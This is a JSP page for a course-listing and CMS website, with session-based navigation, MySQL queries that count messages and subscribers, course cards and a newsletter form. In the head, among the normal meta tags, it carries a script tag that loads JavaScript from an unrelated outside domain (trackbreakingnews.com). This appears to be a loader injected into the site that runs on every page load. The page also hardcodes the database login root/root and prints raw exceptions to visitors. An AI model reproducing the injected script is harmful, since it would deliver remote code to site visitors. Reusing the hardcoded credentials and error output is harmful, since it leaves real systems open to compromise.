<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
     <%@ page import="java.sql.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">


  <head>
  	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  	<script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Course</title>

    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <link href="CSS/Stylez1.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]>
    <script src="js/ie8-responsive-file-warning.js"></script>
    <![endif]-->
    <script src="js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="js/wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>
  
  
				<div class="navbar navbar-default navbar-fixed-top pulse animated">
					<div class="container">
						<a class="navbar-brand XX" href="Data1.jsp">
							<img src="iWall/logo1.png"><p>CMS</p>
						</a>
						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						</button>
						<div class="collapse navbar-collapse">
					<ul class="nav navbar-nav pull-right">
						<li> <a href="Home2.jsp">Home</a></li>
					<li> <a href="Course.jsp">Course</a></li>
					
					
				 <%
						 session=request.getSession();
                   		String ss1=(String) session.getAttribute("xuser");
                   		String ss2=(String) session.getAttribute("xmail");
						if(ss1==null && ss2==null){
                     %>
                     <li  class="active"> <a href="Owner1.jsp">Owner</a></li>
					<li> <a href="Login1.jsp">Login</a></li>
					<%}
						else if(ss2==null && ss1!=null){%>
						
				<li> <a href="EmailForm.jsp">Contact Us</a></li>
					<li class="dropdown">
						<a href="#" data-toggle="dropdown" class="dropdown-toggle">More <span class="caret"></span></a>
						<ul class="dropdown-menu">
						<li> <a href="Owner1.jsp"><%=ss1 %></a> </li>
						<li class="divider"></li>
						<li><a href="#">Setting</a> </li>
						<li class="divider"></li>
						<li> <a href="Logout2.jsp">Logout</a> </li>
						
						<%} %>
						
						
                   <%
						 session=request.getSession();
                   		String ss=(String) session.getAttribute("xmail");
						if(ss!=null){
                     %>
                     
						<%
						int count=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from msg";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
					<li><a href="Msg3.jsp">Message <span class="badge"> <%=count %> </span></a></li>
					
					
						<%
						int count1=0;
						try{
						Class.forName("com.mysql.jdbc.Driver");
						Connection con=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
						String str="select * from sub";
						PreparedStatement ps=con.prepareStatement(str);
						ResultSet rs=ps.executeQuery();
						while(rs.next()) {
						count1++;
						}
						con.close();
						}catch(Exception e) {
							out.println(e);
						}
						
						%>
					<li> <a href="Sub2.jsp">Subscribers<span class="badge"> <%=count1 %> </span></a></li>

					<li class="dropdown">
					<a href="#" data-toggle="dropdown" class="dropdown-toggle">Contact Us <span class="caret"></span></a>
					<ul class="dropdown-menu">
					
						<li><a href="Owner1.jsp"><%=ss %></a></li>
						<li class="divider"></li>
						<li><a href="Forgot.jsp">Setting</a></li>
						<li class="divider"></li>
						<li><a href="Msg2.jsp">Message <span class="badge"> <%=count %> </span></a></li>
						<li class="divider">
						<li><a href="index.html">Activity-Log</a></li>
						<li class="divider"></li>
						<li><a href="Logout.jsp">Logout</a></li>
					</UL>
						

					</li>
					<%
						}
					%>
					</ul>
	          </div> 
	      </div>
	  </div>


  		
	<div class="container-fluid XOO1">
		<div class="container XOO1">
		<div class="row">
		<div class="col-lg-12">
		<img src="iWall/Dxx.jpg" alt="Dxx" class="img-responsive">
		<h5 class="font-thin">SUB<span class="font-semibold">SIGN</span></h5>
		<h4 class="font-thin">The little thing <span class="font-semibold">that makes all the difference.</span></h4><br/><br/>
		</div>
		
		<div class="col-lg-4">
		<img src="iWall/inspired_footer_it_icon.png" alt="inspired_footer_it_icon" class="img-responsive">
		</div>
		</div>
	</div></div>
	<div class="container-fluid XOO">
		<div class="container XOO">
		
		<div class="row LXN">
		<div class="col-lg-12">
			<h3 class="font-thin">We <span class="font-semibold">bring companies alive </span>by visually telling their <br/>stories.</h3>
			<br/>
			<br/>
			<br/><h3 class="font-thin">This is what  <span class="font-semibold">we do best</span></h3><br/><br/>
		
		</div>
		</div>
		
		<div class="row">
			<div class="col-lg-3">
			<h5 class="font-thin">Visual <span class="font-semibold">Identity</span> </h5><br/>
			<p>We help our clients</br> create a strong and</br> distinctive visual</br> identity.</p>
			</div>
			<div class="col-lg-3">
			<h5 class="font-thin">Web  <span class="font-semibold">Design</span> </h5><br/>
			<p>We apply user-centered<br/> principles to create an<br/> elegant and unique web<br/> design.</p>
			</div>
			<div class="col-lg-3">
			<h5 class="font-thin">Mobile <span class="font-semibold">Apps</span> </h5><br/>
			<p>We will create your<br/> mobile app so that you<br/> will always be where<br/> your customers are.</p>
			</div>
			
			<div class="col-lg-3">
			<h5 class="font-thin"><span class="font-semibold">Development</span> </h5><br/>
			<p>After brainstorming the<br/> webdesign or mobile<br/> app our team will make <br/>the magic happen.</p><br/><br/><br/>
			</div>
		</div>
		
		</div><br/><br/></div>
		<div class="row line-row">
		
		</div>
		</div>
		<div class="container ZZ1"><br/><br/><br/>
			<strong>POPULAR COURSES</strong> <br/> <br/>
			<div class="row GX">
				<div class="col-lg-3">
						<div class="thumbnail">
							<img src="iWall/fac-img1.jpg" alt="fac-img2" class="img-responsive img-thumbnail">
							<div class="caption">
								<strong class="lead">Engineering and Technology</strong><hr>
							<p>
								Those candidates desiring to pursue further studies are doing immensely well in both India and abroad. In India, our students are present in large numbers in major industrial houses in India and abroad. Each year, a large number of our students also qualify the GATE exam with high percentile.
							</p> <br/>
								<button type="button" class="btn btn-default">Read More</button>
							</div>
						</div>
				</div>

					<div class="col-lg-3">
						<div class="thumbnail">
							<img src="iWall/fac-img2.jpg" alt="fac-img2" class="img-responsive img-thumbnail">
							<div class="caption">
								<strong class="lead">School of Management Studies</strong> <hr>
								<p>
									Faculty of Management Studies MBA program model combines a traditional but highly focused curriculum with a  workshops small-group learning experiences that are action-oriented. We expect our students to immerse themselves wholly in the program during its 2 years.
								</p>
								<br/>
								<button type="button" class="btn btn-default">Read More</button>
							</div>
					</div>
				</div>

				<div class="col-lg-3">
					<div class="thumbnail">
						<img src="iWall/fac-img3.jpg" alt="fac-img3" class="img-responsive img-thumbnail">
						<div class="caption">
							<strong class="lead">School of Computer Application</strong> <hr>
							<p>GEU School of Computer Application offers specialized courses in
								Computer Science, Computer Application Information Technology and High Performance
								Computing.The faculty members devote time in teaching applied sciences in different branches of Engineering and Computers.
								</p>
								<br/>
								<button type="button" class="btn btn-default">Read More</button>
							</div>
					</div>
				</div>
				<div class="col-lg-3">
					<div class="thumbnail">
						<img src="iWall/fac-img4.jpg" alt="fac-img4" class="img-responsive img-thumbnail">
						<div class="caption">
							<strong class="lead">
							School of Allied Sciences 
							</strong><hr/>
						<p>
							Computer Application Excellence in studies of Applied Sciences has always been the hall mark of Graphic Era University with faculty members of proven excellence and outstanding experience. We have state of the art laboratories enriched with latest research facilities . 						</p><br/>
								<button type="button" class="btn btn-default">Read More</button>
							</div>
					</div>
				</div>
			</div>
		</div>
			<br/><br/><hr>


		<div class="container-fluid CNTT">
			<h2>THE COURSE DETAILS</h2> <br/><br/> 
		<div class="container  fadeIn animated">
			<div class="row GX">
				<div class="col-lg-12 Pp">
							<img src="iWall/number_1_small.png" alt="number_1_small" class="img-responsive pull-left">
							<div class="caption">
							<strong><small>Stage One</small> <br/>WELCOME AND INTRO</strong><br/> <br/> 
							<p>
							Lorem ipsum dolor sit amet, vix erat audiam ei. Cum doctus civibus efficiantur in. Nec id tempor imperdiet deterruisset, doctus volumus explicari qui ex, appareat similique an usu. Vel an hinc putant fierent, saperet legimus offendit sed ei doctus volumus explicari qui ex, appareat similique an usu. . Dolor euripidis cum eu, ea per lucilius periculis corrumpit, ut euismod omittam ancillae his.

							</p> 	<button type="button" class="btn btn-primary btn-sm pull-right">SCHEDULE  </button> <br/><br/>	
							</div><hr>
						</div>		
					</div>
				

				<div class="row GX">
				<div class="col-lg-12 Pp">
							<img src="iWall/number_2_small.png" alt="number_1_small" class="img-responsive pull-left">
							<div class="caption">
								<strong><small>Stage Two</small> <br/>UNDERSANDING PRINCIPLES</strong><br/> <br/> 
							<p>
							Lorem ipsum dolor sit amet, vix erat audiam ei. Cum doctus civibus efficiantur in. Nec id tempor imperdiet deterruisset, doctus volumus explicari qui ex, appareat similique an usu. Vel an hinc putant fierent, saperet legimus offendit sed ei doctus volumus explicari qui ex, appareat similique an usu. . Dolor euripidis cum eu, ea per lucilius periculis corrumpit, ut euismod omittam ancillae his.
									</p><button type="button" class="btn btn-primary btn-sm pull-right">SCHEDULE  </button> <br/><hr></div>
								</div>
							<br/>
							</div>
				<div class="row GX">
				<div class="col-lg-12 Pp">
							<img src="iWall/number_3_small.png" alt="number_3_small" class="img-responsive  pull-left">
							<div class="caption">
							<strong><small>Stage Three</small> <br/>DIAGRAMS AND CHARTS</strong><br/> <br/> 
							<p>
							Lorem ipsum dolor sit amet, vix erat audiam ei. Cum doctus civibus efficiantur in. Nec id tempor imperdiet deterruisset, doctus volumus explicari qui ex, appareat similique an usu. Vel an hinc putant fierent, saperet legimus offendit sed ei doctus volumus explicari qui ex, appareat similique an usu. . Dolor euripidis cum eu, ea per lucilius periculis corrumpit, ut euismod omittam ancillae his.
							</p><button type="button" class="btn btn-primary btn-sm pull-right">SCHEDULE  </button> <br/><hr></div>
								</div>
							<br/>
							</div>

				<div class="row GX">
				<div class="col-lg-12 Pp"><br/>
					
							<img src="iWall/number_4_small.png" alt="number_4_small" class="img-responsive pull-left">
							<div class="caption">
								<strong><small>Stage Four</small> <br/>FUNDAMENTALS</strong><br/> <br/> 
							<p>
							Lorem ipsum dolor sit amet, vix erat audiam ei. Cum doctus civibus efficiantur in. Nec id tempor imperdiet deterruisset, doctus volumus explicari qui ex, appareat similique an usu. Vel an hinc putant fierent, saperet legimus offendit sed ei doctus volumus explicari qui ex, appareat similique an usu. . Dolor euripidis cum eu, ea per lucilius periculis corrumpit, ut euismod omittam ancillae his.
									</p><button type="button" class="btn btn-primary btn-sm pull-right">SCHEDULE  </button> <br/><hr></div>
								</div>
							<br/>
							</div>

				<div class="row GX">
				<div class="col-lg-12 Pp"><br/>
					
							<img src="iWall/number_5_small.png" alt="number_5_small.png" class="img-responsive  pull-left">
							<div class="caption">
								<strong><small>Stage Five</small> <br/>FOCUS ON BUSINESS PLAN</strong><br/> <br/> 
							<p>
							Lorem ipsum dolor sit amet, vix erat audiam ei. Cum doctus civibus efficiantur in. Nec id tempor imperdiet deterruisset, doctus volumus explicari qui ex, appareat similique an usu. Vel an hinc putant fierent, saperet legimus offendit sed ei doctus volumus explicari qui ex, appareat similique an usu. . Dolor euripidis cum eu, ea per lucilius periculis corrumpit, ut euismod omittam ancillae his.
									</p><button type="button" class="btn btn-primary btn-sm pull-right">SCHEDULE  </button> <br/><hr></div>
								</div>
							<br/>
							</div>

				<div class="row GX">
				<div class="col-lg-12 Pp">
					
							<img src="iWall/number_6_small.png" alt="cnumber_2_small" class="img-responsive pull-left">
							<div class="caption">
								<strong><small>Stage Six</small> <br/>FINAL TEST AND SUMMARY</strong><br/> <br/> 
							<p>
							Lorem ipsum dolor sit amet, vix erat audiam ei. Cum doctus civibus efficiantur in. Nec id tempor imperdiet deterruisset, doctus volumus explicari qui ex, appareat similique an usu. Vel an hinc putant fierent, saperet legimus offendit sed ei doctus volumus explicari qui ex, appareat similique an usu. . Dolor euripidis cum eu, ea per lucilius periculis corrumpit, ut euismod omittam ancillae his.
							</p><button type="button" class="btn btn-primary btn-sm pull-right">SCHEDULE  </button> <br/><hr></div>
								</div>
							<br/>
							</div>
					</div>
				</div>
			<hr>
	</div>
	
		<div class="container ZZ1">
			<strong>MORE COURSES</strong><br/><br/> 
			<div class="row">
				<div class="col-lg-3">
					<div class="thumbnail">
					<img src="iWall/softwaretraining1.jpg" alt="softwaretraining1" class="img-responsive img-thumbnail">
					<div class="caption">
							<h4 class="lead">Software Training</h4> <hr>
							<span class="glyphicon glyphicon-star"></span>
							<span class="glyphicon glyphicon-star"></span>
							<span class="glyphicon glyphicon-star"></span>
							<span class="glyphicon glyphicon-star"></span>
							<span class="glyphicon glyphicon-star"></span>
															Free<hr/>
							<button type="button" class="btn btn-default"> View More</button>
							<button type="button" class="btn btn-success pull-right"> Text Me Link</button>
						</div>
					</div>
				</div>
				
			<div class="col-lg-3">
					<div class="thumbnail">
					<img src="iWall/writing1.jpg" alt="writing1" class="img-responsive  img-thumbnail">
						<div class="caption">
							<h4 class="lead">How to write effectively</h4> <hr>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>Free
								<hr/>
							<button type="button" class="btn btn-default"> View More</button>
							<button type="button" class="btn btn-success pull-right"> Text Me Link</button>
						</div>
					</div>
				</div>

				<div class="col-lg-3">
					<div class="thumbnail">
					<img src="iWall/photography31.jpg" alt="photography31" class="img-responsive img-thumbnail">
						<div class="caption">
							<h4 class="lead">Nature Photography</h4><hr>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>
								Free
								<hr/>
							<button type="button" class="btn btn-default"> View More</button>
							<button type="button" class="btn btn-success pull-right"> Text Me Link</button>
							</div>
						</div>
					</div>

				<div class="col-lg-3">
					<div class="thumbnail">
					<img src="iWall/mobileapps1.jpg" alt="mobileapps1" class="img-responsive img-thumbnail">
						<div class="caption">
							<h4 class="lead">Developing Mobile Apps</h4> <hr>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>
								<span class="glyphicon glyphicon-star"></span>Free</span>
								<hr/>
							<button type="button" class="btn btn-default"> View More</button>
							<button type="button" class="btn btn-success pull-right"> Text Me Link</button>

							</div>
						</div>
					</div>
				</div>
			</div> <br/> <hr>

<div class="container ZZ2">
			<strong>OUR COURSES</strong> <br/> <br/>
			<div class="row GX">
				<div class="col-lg-4">
						<div class="thumbnail">
							<img src="iWall/intro_img5.jpg" alt="intro_img5" class="img-responsive img-thumbnail">
							<div class="caption">
								<strong class="lead">Under Graduate Programs</strong><hr>
							<p>
							<a href="#"> <h3>$ 60<small>Per One Month </small></h3></a>
							</p> 
								<button type="button" class="btn btn-default">Read More</button>
							</div>
						</div>
				</div>
				<div class="col-lg-4">
						<div class="thumbnail">
							<img src="iWall/intro_img4.jpg" alt="intro_img4" class="img-responsive img-thumbnail">
							<div class="caption">
								<strong class="lead">Post Graduate Programs</strong><hr>
							<p>
								<a href="#"> <h3>$ 80<small>Per One Month </small></h3></a>
							</p> 
								<button type="button" class="btn btn-default">Read More</button>
							</div>
						</div>
				</div>
				<div class="col-lg-4">
						<div class="thumbnail">
							<img src="iWall/intro_img3.jpg" alt="intro_img3" class="img-responsive img-thumbnail">
							<div class="caption">
								<strong class="lead">Graduate Programs</strong><hr>
							<p>
								<a href="#"> <h3>$ 50<small>Per One Month </small></h3></a>
							</p> 
								<button type="button" class="btn btn-default">Read More</button>
							</div>
						</div>
				</div>
				</div>
				</div><br/>
		

		<div class="container-fluid CNTXX">
  			<div class="row">		
			<div class="col-lg-12 CNTXX1">
  					<strong class="lead">We've got what you need! </strong>
  						<h5 class="lead">Still Have Questions?</h5>
  					<small> Contact Us</small> <p> Share Us</p><br/><br/>
  					<a href="www.insstagram.com"><img src="iWall/instagram.png" alt="instagram"></a>
  					<a href="#"><img src="iWall/twitter.png" alt="twitter"></a>
  					<a href="www.facebook.com/ajaysinghbisht002"><img src="iWall/facebook.png" alt="facebook"></a>
  					<a href="#"><img src="iWall/google_plus.png" alt="google-plus"></a>
  					<a href="#"><img src="iWall/you-tube.png" alt="you-tube"></a>
  					<a href="#"><img src="iWall/skype.png" alt="skype"></a>

		  	</div></div>
		  	<hr>
		  	<div class="row">
		  		<div class="col-lg-12">
		  			<h4 class="lead">Subscribe to our Newsletter for latest news.</h4>
		  			<form class="form-inline  FCC" action="Sub.jsp" method="post">
		  			<input type="email" placeholder="Enter Email" name="nmz"class="form-control FCC1">
		  		<button type="submit" class="btn btn-default">Subscribe </button></form>
		  		</div>
		  	</div>
		  	<div class="row">
		  		<div class="col-lg-3">
					<h2 class="lead"><span class=" glyphicon glyphicon-cloud"></span> Browse</h2>
					   <h6>  Prices<br/>
					    Courses<br/>
					    Blog<br/>
					    Contacts</h6>
		  		</div>
		  		<div class="col-lg-3">

					<h2 class="lead"><span class="glyphicon glyphicon-save-file"></span>  About Learn</h2>
					  <h6> About Us<br/>
					    Apply<br/>
					    Terms and conditions<br/>
					    Register</h6>

		  		</div>


		  		<div class="col-lg-3">		  		
					<h2 class="lead"><span class="glyphicon glyphicon-open-file"></span>  Next Courses</h2>
					  <h6> Biology<br/>
					    Management<br/>
					    History<br/>
					    Litterature</h6>
				</div>


		  		<div class="col-lg-3">
		  			<h2 class="lead"> <span class="glyphicon glyphicon-earphone"></span>  Contact Us</h2>
					    <h6> 
					    Whats app:(+91) 9897989732<br/>
					    Instagram: thespartan002<br/>
					    facebook: fb/ajaysinghbisht002<br/>
					    Twitter: @002ajay</h6>

		  		</div>
		  	</div><hr/></div>
		  	<div class="container-fluid CNTXX3">
		  			<div class="row">
		  				<div class="col-lg-12">
						<img src="iWall/Map.png" alt="Map" class="mg-responsive img-thumbnail">
						</div>	
						</div>
					</div>
				<div class="Cvv">
						<div class="container-fluid FFF">
							<div class="row">
						<div class="col-lg-12  FF">
							<h5>
							@2015 All Rights Reserved / Legal Notices / Privacy Policy  <small>Ajay Singh Bisht | 2015 | @002ajay</small>
							</h5>
						</div>
					</div>
				</div>


			  <script src="jquery.min.js"></script>
			    <script src="js/bootstrap.min.js"></script>
			    <script src="js/docs.min.js"></script>
			    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
			    <script src="js/ie10-viewport-bug-workaround.js"></script>
			    <script>
				$('.dropdown').hover(function() {
					$('.dropdown-toggle',this).trigger('click');
				});
				</script>
			  </body>
			</html>
  